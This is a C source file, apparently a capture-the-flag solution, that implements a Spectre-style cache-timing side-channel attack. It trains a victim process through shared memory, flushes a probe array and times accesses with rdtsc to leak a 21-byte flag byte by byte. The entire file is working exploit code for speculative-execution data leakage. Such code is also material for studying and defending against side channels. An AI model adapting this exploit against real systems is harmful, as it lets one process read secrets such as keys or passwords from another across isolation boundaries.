#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <semaphore.h>
#include <sched.h>
#include <x86intrin.h>
#include <stdint.h>
#include <stdbool.h>

#define SHARED_MEM_ADDR 0x1337000
#define CACHE_LINE_SIZE 0x1000
#define FLAG_LENGTH 21
#define CACHE_HIT_THRESHOLD 120

volatile int *shared_index;
volatile sem_t *shared_sem;
char *probe_array;

uint64_t time_access_no_flush(void *addr) {
    uint64_t start, end;
    _mm_mfence();
    start = __rdtsc();
    volatile char x = *(volatile char*)addr;
    _mm_mfence();
    end = __rdtsc();
    return end - start;
}

void flush_probe_array() {
    for (int i = 0; i < 256; i++) {
        void *addr = probe_array + i * CACHE_LINE_SIZE;
        _mm_clflush(addr);
    }
    _mm_mfence();
}

void train_victim() {
    // Train with valid indices (< FLAG_LENGTH)
    for (int i = 0; i < 10; i++) {
        *shared_index = i % FLAG_LENGTH;  // Use valid indices
        sem_post((sem_t*)shared_sem);
        sched_yield();
    }
}

void speculate_position(int target_pos) {
    // Try to get the victim to speculatively access flag[target_pos]
    *shared_index = target_pos;
    sem_post((sem_t*)shared_sem);
    sched_yield();
}

bool check_cache_hit(int byte_val) {
    void *test_addr = probe_array + byte_val * CACHE_LINE_SIZE;
    uint64_t timing = time_access_no_flush(test_addr);
    
    if (byte_val >= 0x20 && byte_val <= 0x7e && timing <= CACHE_HIT_THRESHOLD) {
        printf("Cache hit! byte=%c(0x%02x) timing=%lu\n", byte_val, byte_val, timing);
        return true;
    }
    return false;
}

void measure_cache_hits(int *stats) {
    // Check cache hits with randomized order to avoid patterns
    for (int i = 0; i < 256; i++) {
        int byte_val = ((i * 167) + 13) & 0xff;
        if (check_cache_hit(byte_val)) {
            stats[byte_val]++;
        }
    }
}

char extract_byte(int position) {
    printf("=== Extracting position %d ===\n", position);
    
    int stats[256] = {0};
    int total_rounds = 1000;
    
    for (int round = 0; round < total_rounds; round++) {
        // 1. Flush the probe array
        flush_probe_array();
        
        // 2. Train the victim with valid accesses
        train_victim();
        
        // 3. Flush again to remove training artifacts
        flush_probe_array();
        
        // 4. Attempt speculation on target position
        speculate_position(position);
        
        // 5. Measure which cache lines were loaded
        measure_cache_hits(stats);
        
        // Progress report
        if ((round + 1) % 100 == 0) {
            int max_hits = 0;
            char best_char = 0;
            for (int i = 0x20; i <= 0x7e; i++) {
                if (stats[i] > max_hits) {
                    max_hits = stats[i];
                    best_char = i;
                }
            }
            printf("Round %d: best='%c' hits=%d\n", round + 1, best_char, max_hits);
        }
    }
    
    // Find the character with most cache hits
    int max_hits = 0;
    char best_char = '?';
    
    printf("\nResults for position %d:\n", position);
    for (int i = 0x20; i <= 0x7e; i++) {
        if (stats[i] > 0) {
            printf("'%c': %d hits\n", i, stats[i]);
            if (stats[i] > max_hits) {
                max_hits = stats[i];
                best_char = i;
            }
        }
    }
    
    if (max_hits > 2) {  // Need at least 3 hits for confidence
        printf("Selected: '%c' with %d hits\n", best_char, max_hits);
        return best_char;
    } else {
        printf("No clear winner, marking as unknown\n");
        return '?';
    }
}

void calibrate_cache_timing() {
    printf("Calibrating cache timing...\n");
    
    void *test_addr = probe_array;
    
    // Test cache miss
    _mm_clflush(test_addr);
    _mm_mfence();
    uint64_t miss_time = time_access_no_flush(test_addr);
    
    // Test cache hit
    volatile char x = *(volatile char*)test_addr;  // Load into cache
    uint64_t hit_time = time_access_no_flush(test_addr);
    
    printf("Cache miss: %lu cycles\n", miss_time);
    printf("Cache hit: %lu cycles\n", hit_time);
    printf("Threshold: %d cycles\n", CACHE_HIT_THRESHOLD);
    printf("Suggested threshold: %lu cycles\n", (miss_time + hit_time) / 2);
}

bool all_solved(char *results, int len) {
    for (int i = 0; i < len; i++) {
        if (results[i] == 0 || results[i] == '?') {
            return false;
        }
    }
    return true;
}

void exploit_flag() {
    char results[FLAG_LENGTH + 1] = {0};
    
    printf("Starting flag extraction...\n");
    
    int attempts = 0;
    while (!all_solved(results, FLAG_LENGTH) && attempts < 3) {
        attempts++;
        printf("\n=== Attempt %d ===\n", attempts);
        
        for (int i = 0; i < FLAG_LENGTH; i++) {
            if (results[i] != 0 && results[i] != '?') {
                printf("Position %d already solved: '%c'\n", i, results[i]);
                continue;
            }
            
            results[i] = extract_byte(i);
            
            printf("\nCurrent flag: ");
            for (int j = 0; j < FLAG_LENGTH; j++) {
                printf("%c", results[j] ? results[j] : '?');
            }
            printf("\n");
        }
    }
    
    printf("\n=== FINAL RESULT ===\n");
    printf("Flag: ");
    for (int i = 0; i < FLAG_LENGTH; i++) {
        printf("%c", results[i] ? results[i] : '?');
    }
    printf("\n");
}

int main() {
    printf("Starting clean Spectre attack...\n");
    
    // Set up shared memory access
    shared_index = (volatile int*)SHARED_MEM_ADDR;
    shared_sem = (volatile sem_t*)(SHARED_MEM_ADDR + sizeof(int));
    probe_array = (char*)(SHARED_MEM_ADDR + 0x1000);
    
    printf("Shared index: %p\n", shared_index);
    printf("Shared semaphore: %p\n", shared_sem);
    printf("Probe array: %p\n", probe_array);
    
    // Calibrate timing
    calibrate_cache_timing();
    
    // Run the exploit
    exploit_flag();
    
    return 0;
}
